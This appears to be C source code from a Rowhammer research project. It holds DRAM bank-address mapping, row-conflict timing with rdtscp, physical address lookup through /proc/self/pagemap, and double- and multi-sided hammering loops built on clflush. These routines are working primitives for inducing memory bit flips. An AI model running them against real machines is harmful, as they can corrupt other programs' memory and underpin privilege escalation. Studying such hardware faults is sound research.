
#define _GNU_SOURCE
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <string.h>


#include <sys/wait.h>
#include <stdio.h>
#include <unistd.h>



#include <stdio.h>
#include <stdint.h>
#include <sys/statvfs.h>

#include <sys/stat.h>
#include <fcntl.h>


#include <stdbool.h>
#include <assert.h>
#include <time.h>

#include <pthread.h>
#include <errno.h>
#include <math.h>
#include <sys/sysinfo.h>


// this struct will hold info on the addresses to hammer
// and their corresponding victim pages
typedef struct {
    u_int64_t agg1;
    u_int64_t agg2;
    u_int32_t num_victims;
    u_int64_t victim_pages[10];
}hammerGroup;

typedef struct {
    u_int64_t BA0;
    u_int64_t BA1;
    u_int64_t BA2;
    u_int64_t BA3;
    u_int64_t channel;
    u_int64_t rank;
    u_int64_t dimm;
    u_int64_t row_num;
}DramAddr;

#define PAGE_SIZE (1<<12)


// change for each system
//Haswell 1 channel 2 dimms
// void dram_address(u_int64_t phys_addr, DramAddr* addr){
//     addr->BA0 = ((phys_addr & 1<<13) >> 13) ^ ((phys_addr & 1<<18) >> 18);
//     addr->BA1 = ((phys_addr & 1<<14) >> 14) ^ ((phys_addr & 1<<19) >> 19);
//     addr->BA2 = ((phys_addr & 1<<17) >> 17) ^ ((phys_addr & 1<<21) >> 21);
//     addr->rank = ((phys_addr & 1<<16) >> 16) ^ ((phys_addr & 1<<20) >> 20);
//     addr->dimm = (phys_addr & 1<<15);
    
//     return;
// }

// stalin addr func from hardware tracker
void dram_address(u_int64_t phys_addr, DramAddr* addr){
    addr->BA0 = ((phys_addr & 1<<6) >> 6) ^ ((phys_addr & 1<<13) >> 13); //done
   
    addr->BA1 = ((phys_addr & 1<<14) >> 14) ^ ((phys_addr & 1<<17) >> 17); //done
    
    addr->BA2 = ((phys_addr & 1<<15) >> 15) ^ ((phys_addr & 1<<18) >> 18); //done
    
    addr->BA3 = ((phys_addr & 1<<16) >> 16) ^ ((phys_addr & 1<<19) >> 19); //done
    
    addr->rank = 0;
    addr->dimm = 0;
    addr->row_num = (phys_addr & 0x3fffe0000) >> 17;
    
    return;
}

inline __attribute__((always_inline)) void
flush_addr(char* addr){
    asm __volatile__(
        "clflush 0(%0)\n\t"
        :
        :"r"(addr)
        :
    );
}

inline __attribute__((always_inline)) uint64_t
rdtscp(void)
{
  uint64_t lo, hi;
  asm volatile("rdtscp\n"
               : "=a"(lo), "=d"(hi)::"%rcx");
  return (hi << 32) | lo;
}



// only works when program ran as sudo

u_int64_t get_physical_addr(uintptr_t virtual_addr){
	int fd = open("/proc/self/pagemap", O_RDONLY);
    assert(fd >= 0);

    off_t pos = lseek(fd, (virtual_addr / PAGE_SIZE) * 8, SEEK_SET);
    assert(pos >= 0);
    uint64_t value;
    int got = read(fd, &value, 8);
    assert(got == 8);
    int rc = close(fd);
    assert(rc == 0);

    // Check the "page present" flag.
    assert(value & (1ULL << 63));

    uint64_t frame_num = value & ((1ULL << 54) - 1);
    return (frame_num * PAGE_SIZE) | (virtual_addr & (PAGE_SIZE - 1));
}

void flush_chunck(char* mem, u_int32_t mem_size){
    for(int i =0; i<mem_size; i+=64){
        flush_addr(mem + i);
    }
}



inline __attribute__((always_inline)) uint64_t 
row_conflict_time(u_int64_t a, u_int64_t b){
    u_int64_t time;

    asm volatile(
        "clflush 0(%1)\n\t"
        "clflush 0(%2)\n\t"
        "lfence\n\t"
        "rdtscp\n\t"
        "lfence\n\t"	
        "mov %%rax, %%rdi\n\t"
        "mov (%1), %%rax\n\t"
        "mov (%2), %%rax\n\t"

        "lfence\n\t"
        "rdtscp\n\t"
        "lfence\n\t"
        "sub %%rdi, %%rax\n\t"

        : "=a"(time)
	    :  "b"(a) , "S"(b)
	    : "rdi", "rdx" ,"rcx"  
    );

    return time;

}

inline __attribute__((always_inline)) 
void hammer_asm(char* a, char* b){
    
    asm volatile(
        "clflush 0(%0)\n\t"
        "clflush 0(%1)\n\t"
        "mfence\n\t"
        "mov (%0), %%rax\n\t"
        "mov (%1), %%rax\n\t"

        : 
	    :  "c"(a) , "b"(b)
	    : "rax", "memory"
    );
    return;
}

inline __attribute__((always_inline)) 
void multi_sided(char** a, int num_agg, int togg){

    for (int t=0; t< togg; t++){
        for(int i=0; i< num_agg; i++){
            asm volatile(
                "clflush 0(%0)\n\t"
                "mfence\n\t"
                "mov (%0), %%rax\n\t"

                : 
                :  "c"(a[i]) 
                : "rax", "memory"
            );
        }
    }
    
    
    
    return;
}


inline __attribute__((always_inline)) 
void hammer(char* a, char* b, int toggles){
    for(int i=0; i<toggles; i++){
        hammer_asm(a,b);
        
    }
    return;
}


// from Ingab mjrnr
static inline __attribute__ ((always_inline))
void clflushopt(volatile void *p)
{
	asm volatile ("clflushopt (%0)\n"::"r" (p):"memory");
}



bool check_consecutive(u_int64_t mem, u_int64_t size){
	u_int64_t prev = get_physical_addr(mem);
	u_int64_t phys;
	bool out = true;
	for(u_int64_t i=mem+PAGE_SIZE; i<mem+size; i+= PAGE_SIZE){
		phys = get_physical_addr(i);
        // printf("%lx\n",phys);
		// printf("Vaddr: %lx   Paddr: %lx\n",i, phys);
		if(phys != prev + PAGE_SIZE){
			// printf("NOT consecutive");
			out = false;
		}
		prev  = phys;
	}
	return out;
	
}

static inline __attribute__ ((always_inline))
void mfence()
{
	asm volatile ("mfence":::"memory");
}

int64_t hammer_thp_prehammer(char** v_lst, int skip_iter, int len_aggr)
{
	
	// fprintf(stderr, "prehammer             %d: ", skip_iter);
	// fprintf(out_fd, " prehammer             %d: ", skip_iter);
	// fflush(out_fd);
	int len_dummy = skip_iter;
	// int len_aggr = patt->len;


	// char **v_lst = (char **)malloc(sizeof(char *) * len_aggr);
	// for (size_t i = 0; i < len_aggr; i++)
	// {
	// 	v_lst[i] = thp_dram_2_virt(patt->d_lst[i], patt->v_baselst[i]);
	// }



	// /uint64_t cl0, cl1; // ns
	size_t rounds = 600000;
	// fprintf(stderr, "r: %lu l: %lu \n", patt->rounds, patt->len);

	for (int i = 0; i < 200; i++)
	{
		for (size_t j = 0; j < len_dummy; j += 1)
		{
			*(volatile char *)v_lst[j];
		}
		for (size_t j = 0; j < len_dummy; j += 1)
		{
			clflushopt(v_lst[j]);
		}
		mfence();
	}

	// cl0 = realtime_now();

	for (int i = 0; i < rounds; i++)
	{
		for (size_t j = 0; j < len_aggr; j += 1)
		{
			*(volatile char *)v_lst[j];
		}
		for (size_t j = 0; j < len_aggr; j += 1)
		{
			clflushopt(v_lst[j]);
		}
		mfence();
	}
	// cl1 = realtime_now();

	// free(v_lst);
	// return (cl1-cl0) / 1000000; //ms
	return 0; // ns
}

